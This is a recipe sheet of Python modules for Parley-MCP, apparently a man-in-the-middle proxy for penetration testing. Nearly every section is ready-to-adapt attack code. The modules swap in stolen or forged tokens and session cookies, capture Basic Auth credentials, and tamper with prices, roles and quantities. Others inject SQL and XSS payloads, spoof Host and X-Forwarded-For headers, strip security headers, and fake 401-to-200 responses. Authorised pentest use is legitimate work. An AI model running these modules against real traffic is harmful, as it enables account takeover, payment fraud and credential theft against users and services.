# Parley-MCP Module Recipes

Penetration testing module patterns organized by attack category.
Each recipe is a complete, working module you can adapt.

---

## Authentication Attacks

### Swap Bearer/JWT Token (Privilege Escalation)

Capture a low-privilege token, replace it with a stolen/forged high-privilege one:

```python
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    old_token = b'Bearer eyJhbGciOi...LOW_PRIV_TOKEN'
    new_token = b'Bearer eyJhbGciOi...ADMIN_TOKEN'
    message_data = message_data.replace(old_token, new_token)
    return message_data
```

### Swap Cookie Session

Replace your session cookie with another user's:

```python
import re
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    message_data = re.sub(
        rb'session_id=[a-f0-9]+',
        b'session_id=STOLEN_SESSION_VALUE',
        bytes(message_data)
    )
    return bytearray(message_data)
```

### Strip Authentication Requirement from Response

Make the client think auth succeeded when the server rejected it:

```python
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    # direction="server" — modifying what the server sends back
    message_data = message_data.replace(
        b'HTTP/1.1 401 Unauthorized',
        b'HTTP/1.1 200 OK'
    )
    return message_data
```

### Decode and Capture Credentials (Read-Only)

Observe HTTP Basic Auth without modifying traffic:

```python
from lib_http_basic import extract_basic_auth
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    creds = extract_basic_auth(message_data)
    for username, password, auth_type in creds:
        print(f"[CREDS] {auth_type} - {username}:{password}")
    return message_data  # passthrough, don't modify
```

### Decode JWT and Log Claims (Read-Only)

```python
from lib_jwt import extract_bearer_tokens, decode_jwt
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    tokens = extract_bearer_tokens(message_data)
    for token in tokens:
        header, payload, sig, err = decode_jwt(token)
        if payload:
            print(f"[JWT] sub={payload.get('sub')} "
                  f"roles={payload.get('roles')} "
                  f"exp={payload.get('exp')}")
    return message_data
```

---

## Parameter Tampering

### Change JSON Field Value

```python
import json
import re
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    data = bytes(message_data)
    if b'Content-Type: application/json' not in data:
        return message_data

    parts = data.split(b'\r\n\r\n', 1)
    if len(parts) != 2:
        return message_data
    headers, body = parts

    try:
        obj = json.loads(body)
        # Tamper: escalate role, change price, alter quantity, etc.
        if 'role' in obj:
            obj['role'] = 'admin'
        if 'price' in obj:
            obj['price'] = 0.01
        if 'is_admin' in obj:
            obj['is_admin'] = True

        new_body = json.dumps(obj).encode()
        headers = re.sub(
            rb'Content-Length: \d+',
            b'Content-Length: ' + str(len(new_body)).encode(),
            headers
        )
        return bytearray(headers + b'\r\n\r\n' + new_body)
    except (json.JSONDecodeError, UnicodeDecodeError):
        return message_data
```

### Change URL Query Parameters

```python
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    # Modify query params in GET requests
    message_data = message_data.replace(
        b'user_id=123', b'user_id=1'       # IDOR test
    )
    message_data = message_data.replace(
        b'admin=false', b'admin=true'       # privilege escalation
    )
    return message_data
```

### Modify Form POST Data

```python
import re
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    data = bytes(message_data)
    if not data.startswith(b'POST '):
        return message_data
    if b'application/x-www-form-urlencoded' not in data:
        return message_data

    parts = data.split(b'\r\n\r\n', 1)
    if len(parts) != 2:
        return message_data
    headers, body = parts

    # Tamper with form fields
    body = body.replace(b'amount=10.00', b'amount=0.01')
    body = body.replace(b'quantity=1', b'quantity=9999')

    headers = re.sub(
        rb'Content-Length: \d+',
        b'Content-Length: ' + str(len(body)).encode(),
        headers
    )
    return bytearray(headers + b'\r\n\r\n' + body)
```

---

## Injection Attacks

### SQL Injection via Parameter

```python
import re
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    # Inject into a search parameter
    message_data = message_data.replace(
        b'search=test',
        b"search=test' OR '1'='1"
    )
    # Update Content-Length if POST
    data = bytes(message_data)
    if data.startswith(b'POST '):
        parts = data.split(b'\r\n\r\n', 1)
        if len(parts) == 2:
            headers, body = parts
            headers = re.sub(
                rb'Content-Length: \d+',
                b'Content-Length: ' + str(len(body)).encode(),
                headers
            )
            return bytearray(headers + b'\r\n\r\n' + body)
    return message_data
```

### XSS Injection into Server Response

```python
import re
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    # direction="server" — inject into HTML response
    data = bytes(message_data)
    if b'text/html' not in data:
        return message_data

    payload = b'<script>alert("XSS")</script>'
    data = data.replace(b'</body>', payload + b'</body>')

    # Fix Content-Length
    parts = data.split(b'\r\n\r\n', 1)
    if len(parts) == 2:
        headers, body = parts
        headers = re.sub(
            rb'Content-Length: \d+',
            b'Content-Length: ' + str(len(body)).encode(),
            headers
        )
        return bytearray(headers + b'\r\n\r\n' + body)
    return bytearray(data)
```

---

## Header Manipulation

### Add/Remove/Modify HTTP Headers

```python
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    # Inject custom header
    message_data = message_data.replace(
        b'\r\n\r\n',
        b'\r\nX-Forwarded-For: 127.0.0.1'
        b'\r\nX-Real-IP: 127.0.0.1\r\n\r\n',
        1
    )
    # Remove a security header (strip from server responses)
    message_data = bytearray(
        bytes(message_data).replace(b'X-Frame-Options: DENY\r\n', b'')
    )
    return message_data
```

### Downgrade Host Header (Virtual Host Routing Attack)

```python
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    message_data = message_data.replace(
        b'Host: app.example.com',
        b'Host: internal-admin.example.com'
    )
    return message_data
```

---

## Response Manipulation (direction="server")

### Modify API Response Data

```python
import json
import re
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    data = bytes(message_data)
    if b'application/json' not in data:
        return message_data

    parts = data.split(b'\r\n\r\n', 1)
    if len(parts) != 2:
        return message_data
    headers, body = parts

    try:
        obj = json.loads(body)
        # Give ourselves admin in the response
        if isinstance(obj, dict):
            if 'permissions' in obj:
                obj['permissions'].append('admin')
            if 'role' in obj:
                obj['role'] = 'administrator'

        new_body = json.dumps(obj).encode()
        headers = re.sub(
            rb'Content-Length: \d+',
            b'Content-Length: ' + str(len(new_body)).encode(),
            headers
        )
        return bytearray(headers + b'\r\n\r\n' + new_body)
    except (json.JSONDecodeError, UnicodeDecodeError):
        return message_data
```

### Strip Security Headers from Response

```python
import re
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    # Remove headers that block client-side attacks
    for header in [
        b'Content-Security-Policy',
        b'X-Frame-Options',
        b'X-Content-Type-Options',
        b'Strict-Transport-Security',
        b'X-XSS-Protection',
    ]:
        message_data = bytearray(
            re.sub(
                header + rb':.*?\r\n',
                b'',
                bytes(message_data)
            )
        )
    return message_data
```

---

## Conditional Modification

### Only Modify Specific Endpoints

```python
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    data = bytes(message_data)
    # Only tamper with requests to the payment endpoint
    if b'POST /api/payment' not in data:
        return message_data
    # ... modify payment request ...
    return message_data
```

### Only Modify the First Request

```python
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    if message_num != 1:
        return message_data  # only modify first message in connection
    # ... modify the initial handshake/auth ...
    return message_data
```

### Target Specific Destination

```python
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    if dest_port != 8080:
        return message_data  # only modify traffic to port 8080
    # ... modify ...
    return message_data
```

---

## Binary Protocol Patterns

### Modify a Length-Prefixed Binary Message

```python
import struct
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    if len(message_data) < 4:
        return message_data
    # Read 4-byte big-endian length prefix
    msg_len = struct.unpack('>I', message_data[:4])[0]
    payload = message_data[4:4 + msg_len]

    # Modify the payload
    payload = payload.replace(b'\x00\x01', b'\x00\xFF')

    # Rebuild with updated length
    new_len = struct.pack('>I', len(payload))
    return bytearray(new_len + payload + message_data[4 + msg_len:])
```

### Byte-Level Patching at Specific Offset

```python
def module_function(message_num, source_ip, source_port,
                    dest_ip, dest_port, message_data):
    # Patch byte at offset 12 (e.g., change a flags byte)
    if len(message_data) > 12:
        message_data[12] = 0xFF  # bytearray supports index assignment
    return message_data
```

---

## Chaining Modules (Priority System)

Set up a multi-stage pipeline by assigning priorities:

```
module_create(name="01_Log_All",       direction="client", priority=10,  ...)
module_create(name="02_Swap_Auth",     direction="client", priority=50,  ...)
module_create(name="03_Tamper_Body",   direction="client", priority=100, ...)
```

Data flows: raw → Log_All (observes) → Swap_Auth (changes token) → Tamper_Body (changes body) → server.

The logging module at priority 10 sees the original data. The body tamperer at
priority 100 sees data that already has the auth token swapped. Plan your
pipeline accordingly.
